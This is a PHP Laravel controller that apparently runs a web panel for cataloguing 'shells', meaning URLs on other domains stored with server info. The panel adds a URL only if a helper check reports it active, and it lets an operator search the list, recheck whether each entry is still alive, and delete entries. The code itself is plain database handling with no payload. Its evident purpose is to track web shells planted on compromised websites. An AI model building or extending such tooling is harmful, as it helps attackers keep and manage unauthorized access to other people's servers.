<?php

namespace App\Http\Controllers;

use Illuminate\Http\Request;
use Illuminate\Support\Facades\Crypt;
use Helper;

class shellController extends Controller
{
    public function shellindex(Request $request) {
        if (!empty($request->input('keyword'))) {
            $data = \App\Models\Shell::where('url', 'like', "%".$request->input('keyword')."%")
            ->orWhere('server_info', 'like', "%".$request->input('keyword')."%")
            ->paginate(1000);

            return view('shell.shell', [
                'data' => $data
            ]);
        } else {
            $data = \App\Models\Shell::orderBy('id', 'DESC')->paginate(10);
            if (count($data) > 0) {
                return view('shell.shell', [
                    'data' => $data
                ]);
            } else {
                return redirect('/shell/new');
            }
        }
    }

    public function shellview($id) {
        $data = \App\Models\Shell::where('id', Crypt::decryptString($id))->first();
        return view('shell.shell_detail', [
            'data' => $data
        ]);
    }

    public function shellinput() {
        return view('shell.shell_input');
    }

    public function shellsource() {
        return view('shell.shell_source');
    }

    public function shellinputpost(Request $request) {
        date_default_timezone_set('Asia/Jakarta');
        $data = Helper::checkShell($request->url);

        if ($data == false) {
            return redirect('/shell')->with(['alert' => 'Error!']);
        } else {
            if ($data['status'] == 'active') {
                $act = \App\Models\Shell::insert([
                    'url' => $data['url'],
                    'server_info' => $data['server_info'],
                    'domain' => Helper::getDomain($request->url),
                    'status' => $data['status'],
                    'created_at' => date('Y-m-d H:i:s'),
                    'updated_at' => date('Y-m-d H:i:s'),
                ]);
                if ($act) {
                    return redirect('/shell')->with(['alert' => 'Insert Shell Success!']);
                } else {
                    return redirect('/shell')->with(['alert' => 'Error!']);
                }
            }
        }
    }

    public function shellupdate(Request $request) {
        date_default_timezone_set('Asia/Jakarta');
        $url = \App\Models\Shell::select('url')->where('id', Crypt::decryptString($request->id))->first();
        $cek = Helper::checkShell($url->url);
        if ($cek == false) {
            \App\Models\Shell::where('url', $url->url)->update([
                'status' => 'inactive',
                'updated_at' => date('Y-m-d H:i:s'),
            ]);
            return redirect()->back()->with(['alert' => 'Recheck Shell Success!']);
        } else {
            \App\Models\Shell::where('url', $url->url)->update([
                'status' => 'active',
                'updated_at' => date('Y-m-d H:i:s'),
            ]);
            return redirect()->back()->with(['alert' => 'Recheck Shell Success!']);
        }
    }

    public function shelldelete(Request $request) {
        $act = \App\Models\Shell::where('id', Crypt::decryptString($request->id))->delete();
        if ($act) {
            return redirect('/shell')->with(['alert' => 'Delete Shell Success!']);
        } else {
            return redirect('/shell')->with(['alert' => 'Error!']);
        }
    }

    public function shellcheckjq(Request $request) {
        $url = \App\Models\Shell::select('url', 'domain')->where('id', $request->id)->first();
        $cek = Helper::checkShell($url->url);

        if ($cek == false) {
            \App\Models\Shell::where('url', $url->url)->update([
                'status' => 'inactive',
                'updated_at' => date('Y-m-d H:i:s'),
            ]);
            print_r('Inactive');
        } else {
            \App\Models\Shell::where('url', $url->url)->update([
                'status' => 'active',
                'updated_at' => date('Y-m-d H:i:s'),
            ]);
            print_r('Active');
        }
    }
}
